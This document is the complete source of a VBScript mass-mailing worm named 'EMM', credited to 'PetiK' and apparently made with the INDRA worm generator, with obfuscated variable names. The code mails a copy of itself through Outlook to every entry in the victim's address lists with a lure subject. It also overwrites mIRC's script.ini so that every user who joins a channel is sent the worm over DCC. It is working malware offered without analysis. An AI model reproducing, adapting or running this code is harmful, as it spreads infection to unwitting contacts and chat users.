'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
dhtpnfeksxybugs = WScript.ScriptFullName
Set wwjdanqbiucwejx = CreateObject("WScript.Shell")
Set whajvsxxqiccdll = CreateObject("Scripting.FileSystemObject")
Set qgdldxepsrpbyvj = CreateObject("Outlook.Application")
If qgdldxepsrpbyvj <> "" Then
Set rcmigkvjbnymnig = qgdldxepsrpbyvj.GetNameSpace("MAPI")
For fasimyilawsmeju = 1 to rcmigkvjbnymnig.AddressLists.Count
Set nvlgvnpqliqfrxe = qgdldxepsrpbyvj.CreateItem(0)
Set liqsdoxejjdmvlu = rcmigkvjbnymnig.AddressLists.Item(fasimyilawsmeju)
nvlgvnpqliqfrxe.Attachments.Add dhtpnfeksxybugs
nvlgvnpqliqfrxe.Subject = "Hey !!!"
nvlgvnpqliqfrxe.Body = "Important message for you !!!"
Set sirnbxqjkcvqusn = liqsdoxejjdmvlu.AddressEntries
Set rdritsudymltmyw = nvlgvnpqliqfrxe.Recipients
For ohcrxcvvdwpqoqy = 1 to sirnbxqjkcvqusn.Count
nvlgvnpqliqfrxe.Recipients.Add sirnbxqjkcvqusn.Item(ohcrxcvvdwpqoqy)
Next
nvlgvnpqliqfrxe.Send
Next
End If
Set nkwtpdkyraputgh = whajvsxxqiccdll.CreateTextFile("C:\mirc\script.ini", True)
nkwtpdkyraputgh.WriteLine "[script]"
nkwtpdkyraputgh.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
nkwtpdkyraputgh.Write "n1=/dcc  send$nick """
nkwtpdkyraputgh.Write dhtpnfeksxybugs
nkwtpdkyraputgh.WriteLine """ }"
nkwtpdkyraputgh.Close
'Generated with [INDRA] v0.4es.
